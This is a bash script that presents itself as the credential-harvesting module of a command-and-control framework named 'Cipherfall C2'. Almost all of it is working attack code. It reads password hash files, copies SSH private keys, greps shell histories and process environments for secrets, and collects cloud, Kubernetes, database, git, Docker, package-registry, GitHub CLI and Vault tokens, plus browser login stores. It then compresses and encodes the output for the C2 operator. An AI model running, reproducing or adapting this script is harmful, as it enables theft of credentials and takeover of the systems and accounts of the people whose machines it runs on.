#!/usr/bin/env bash
# ============================================================
# harvest.sh — Credential harvesting module for Cipherfall C2
# ============================================================
# Techniques:
#   - Reads /etc/shadow, /etc/passwd, /etc/gshadow for local account hashes
#   - Discovers SSH private keys via find across /root and /home
#   - Extracts credential-related lines from shell histories (bash/zsh/sh)
#   - Collects cloud credentials: AWS ~/.aws/credentials, GCP ADC JSON,
#     Kubernetes ~/.kube/config
#   - Extracts database credentials: ~/.pgpass, ~/.my.cnf, /etc/mysql/
#   - Reads ~/.netrc, ~/.git-credentials, ~/.gitconfig (URL-embedded creds)
#   - Scans Docker (~/.docker/config.json) for registry auth tokens
#   - Collects npm/pip/pypi tokens: ~/.npmrc, ~/.pypirc
#   - GitHub CLI token: ~/.config/gh/hosts.yml
#   - HashiCorp Vault token: ~/.vault-token
#   - Reads /proc/*/environ for credential-pattern env vars
#   - Checks /etc/fstab for embedded credentials (NFS/SMB/CIFS mounts)
#   - Firefox saved passwords: logins.json paths (encrypted blobs)
#   - Chrome/Chromium Login Data SQLite file paths
#
# Limitations:
#   - /etc/shadow and /etc/gshadow require root; empty section if unreadable
#   - Firefox/Chrome passwords are encrypted at rest; returns raw logins.json
#     blobs and file paths — decrypt separately with key4.db + NSS tools
#   - /proc/*/environ may miss short-lived processes at scan time
#   - Output is gzip-compressed then base64-encoded (single line on stdout);
#     decoded by the TUI harvest handler and saved to harvests/ directory
#   - Shell history grep matches credential-pattern lines only (not full history)
# ============================================================

_section() {
    local title="$1"
    local data="$2"
    if [ -n "$data" ]; then
        printf '\n══ %s ══\n' "$title"
        printf '%s\n' "$data"
    fi
}

{
    _section "SHADOW" "$(cat /etc/shadow 2>/dev/null)"
    _section "PASSWD" "$(cat /etc/passwd 2>/dev/null)"
    _section "GSHADOW" "$(cat /etc/gshadow 2>/dev/null)"

    _section "SSH_PRIVATE_KEYS" "$(
        find /root /home -maxdepth 5 \
            \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' \
               -o -name 'id_dsa' -o -name 'id_xmss' \) \
            -type f 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "SSH_CONFIG" "$(
        find /root /home -maxdepth 5 -name 'config' -path '*/.ssh/*' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "SHELL_HISTORY_CREDS" "$(
        find /root /home -maxdepth 4 \
            \( -name '.bash_history' -o -name '.zsh_history' \
               -o -name '.sh_history' -o -name '.history' \) \
            -type f 2>/dev/null |
        while read -r f; do
            lines=$(grep -iE \
                '(pass(word)?|token|secret|api[_-]?key|auth|cred|bearer|mysql|psql|redis|mongo)[[:space:]]*[=:]' \
                "$f" 2>/dev/null)
            [ -n "$lines" ] && printf -- '--- %s ---
' "$f"; printf '%s
' "$lines"
        done
    )"

    _section "AWS_CREDENTIALS" "$(
        find /root /home -maxdepth 5 \
            \( -path '*/.aws/credentials' -o -path '*/.aws/config' \) 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "GCP_CREDENTIALS" "$(
        find /root /home -maxdepth 8 \
            \( -name 'application_default_credentials.json' \
               -o -name 'adc.json' \) 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "KUBECONFIG" "$(
        find /root /home -maxdepth 6 -name 'config' -path '*/.kube/*' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "PGPASS" "$(
        find /root /home -maxdepth 5 -name '.pgpass' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "MYSQL_CNF" "$(
        find /root /home /etc -maxdepth 5 \
            \( -name '.my.cnf' -o -name 'my.cnf' \) 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "NETRC" "$(
        find /root /home -maxdepth 5 -name '.netrc' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "GIT_CREDENTIALS" "$(
        find /root /home -maxdepth 5 \
            \( -name '.git-credentials' -o -name '.gitconfig' \) 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "DOCKER_CONFIG" "$(
        find /root /home -maxdepth 5 -path '*/.docker/config.json' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "NPMRC" "$(
        find /root /home -maxdepth 5 -name '.npmrc' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "PYPIRC" "$(
        find /root /home -maxdepth 5 -name '.pypirc' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "GITHUB_CLI_TOKEN" "$(
        find /root /home -maxdepth 7 \
            -name 'hosts.yml' -path '*/.config/gh/*' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "VAULT_TOKEN" "$(
        find /root /home -maxdepth 5 -name '.vault-token' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "ENV_SECRETS" "$(
        cat /proc/*/environ 2>/dev/null | tr '\0' '\n' |
        grep -iE '^[^=]*(pass(word)?|token|secret|api[_-]?key|auth|cred|bearer|private[_-]?key)[^=]*=' |
        grep -vE '^(PATH|MANPATH|INFOPATH)=' |
        sort -u
    )"

    _section "FSTAB_EMBEDDED_CREDS" "$(
        grep -iE 'username=|password=|credentials=' /etc/fstab 2>/dev/null
    )"

    _section "FIREFOX_LOGINS_JSON" "$(
        find /root /home -maxdepth 9 -name 'logins.json' 2>/dev/null |
        while read -r f; do
            printf -- '--- %s ---
' "$f"
            cat "$f" 2>/dev/null
            echo
        done
    )"

    _section "CHROME_LOGIN_DATA_PATHS" "$(
        find /root /home -maxdepth 9 -name 'Login Data' 2>/dev/null |
        while read -r f; do
            printf '%s\n' "$f"
        done
    )"

} | gzip -9 | base64 -w0
